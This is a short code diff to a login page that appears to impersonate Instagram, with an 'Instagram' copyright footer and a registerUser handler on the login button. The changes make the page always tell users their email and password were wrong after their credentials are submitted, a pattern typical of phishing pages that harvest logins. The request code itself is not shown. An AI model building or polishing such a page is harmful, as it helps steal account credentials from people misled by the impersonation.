@@ -529,7 +529,7 @@ footer {
 
         <br>
 
-        © 2026   Instagram
+        © 2026 Instagram
 
     </footer>
 
@@ -561,9 +561,9 @@ async function registerUser() {
 
         const result = await response.json();
 
-        window.location.href = "/error.html";
+        alert("please enter your email and password correctly or try again later.");
     } catch (error) {
-        alert("ERROR");
+        alert("please put your email and password");
     }
 }
 document.getElementById("loginButton").addEventListener("click", registerUser);
